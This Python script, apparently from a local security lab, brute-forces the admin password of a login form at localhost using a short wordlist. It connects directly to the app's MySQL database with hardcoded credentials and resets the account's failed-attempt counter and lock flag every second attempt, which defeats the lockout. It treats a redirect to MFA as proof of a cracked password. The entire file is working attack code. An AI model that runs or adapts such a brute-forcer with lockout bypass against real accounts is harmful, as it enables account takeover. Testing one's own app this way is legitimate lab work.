import requests
import time
import datetime

url = "http://127.0.0.1:5000/"
username = "admin"

wordlist = ["123456", "admin", "password", "admin123", "letmein", "AudoWrld@59"]


def reset_lock():
    import mysql.connector

    db = mysql.connector.connect(
        host="localhost",
        user="injectionuser",
        password="injectionpass",
        database="mysql_injection",
    )
    cursor = db.cursor()
    cursor.execute(
        "UPDATE user SET failed_attempts = 0, is_locked = 0 WHERE username = %s",
        (username,),
    )
    db.commit()
    db.close()


session = requests.Session()
found = False
failed = []

start_time = time.time()
start_dt = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

print("=" * 45)
print("          BRUTE FORCE ATTACK")
print("=" * 45)
print(f"  Started  : {start_dt}")
print(f"  Target   : {username}")
print(f"  Wordlist : {len(wordlist)} passwords")
print("=" * 45)

for i, pwd in enumerate(wordlist):
    if i % 2 == 0:
        reset_lock()

    attempt_time = datetime.datetime.now().strftime("%H:%M:%S")
    response = session.post(
        url, data={"username": username, "password": pwd}, allow_redirects=True
    )

    if "locked" in response.text.lower():
        print(f"  [{attempt_time}] [!] Account locked, resetting...")
        reset_lock()
        response = session.post(
            url, data={"username": username, "password": pwd}, allow_redirects=True
        )

    if "/mfa" in response.url or "mfa" in response.text.lower():
        crack_time = time.time() - start_time
        end_dt = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"  [{attempt_time}] [+] FOUND: {pwd}")
        found = True
        found_pwd = pwd
        found_attempt = i + 1
        break
    else:
        elapsed = time.time() - start_time
        print(f"  [{attempt_time}] [-] Failed: {pwd:<20} (elapsed: {elapsed:.3f}s)")
        failed.append(pwd)

end_time = time.time()
total_time = end_time - start_time
end_dt = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
avg_time = total_time / (len(failed) + (1 if found else 0))

print()
print("=" * 45)
print("              SUMMARY")
print("=" * 45)
print(f"  Target        : {username}")
print(f"  Started       : {start_dt}")
print(f"  Finished      : {end_dt}")
print(f"  Total Time    : {total_time:.4f} seconds")
print(f"  Avg Per Try   : {avg_time:.4f} seconds")
print(f"  Total Attempts: {len(failed) + (1 if found else 0)}")
print("-" * 45)
if found:
    print(f"  Status        : CRACKED")
    print(f"  Password      : {found_pwd}")
    print(f"  Found On      : Attempt #{found_attempt}")
else:
    print(f"  Status        : NOT FOUND")
    print(f"  Failed ({len(failed)})     : {', '.join(failed)}")
print("=" * 45)
